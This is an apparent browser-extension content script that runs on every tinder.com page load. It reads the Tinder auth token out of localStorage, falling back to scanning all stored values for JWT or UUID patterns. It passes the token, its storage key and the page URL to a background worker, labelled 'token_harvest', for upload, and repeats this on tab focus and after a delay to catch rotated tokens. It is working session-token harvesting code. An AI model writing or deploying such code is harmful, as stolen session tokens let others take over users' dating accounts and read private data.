// Runs on every tinder.com page load. Reads the auth token + relevant
// session metadata out of localStorage and hands it to the background
// service worker for upload.

const STORAGE_KEYS = [
  "TinderWeb/APIToken",
  "TinderWeb/ApiToken",
  "TinderWeb/id",
  "auth_token",
];

const JWT_PATTERN = /^ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/;
const UUID_PATTERN = /^[0-9a-f-]{20,40}$/i;

function pickToken() {
  // Direct key probe
  for (const key of STORAGE_KEYS) {
    const v = localStorage.getItem(key);
    if (v && v.length > 12) return { key, value: strip(v) };
  }
  // Scan values for JWT / UUID shapes
  for (const key of Object.keys(localStorage)) {
    const raw = localStorage.getItem(key);
    if (!raw) continue;
    const v = strip(raw);
    if (JWT_PATTERN.test(v) || UUID_PATTERN.test(v)) {
      return { key, value: v };
    }
  }
  return null;
}

function strip(v) {
  v = v.trim();
  if (v.startsWith('"') && v.endsWith('"')) v = v.slice(1, -1);
  return v;
}

function harvest() {
  const found = pickToken();
  if (!found) return;
  chrome.runtime.sendMessage({
    kind: "token_harvest",
    platform: "tinder",
    token: found.value,
    storage_key: found.key,
    url: location.href,
    at: Date.now(),
  });
}

// Fire on load + whenever focus returns to the tab (token may have rotated)
harvest();
window.addEventListener("focus", harvest);
// And once more after 5s to catch late-hydrating SPA routes
setTimeout(harvest, 5000);
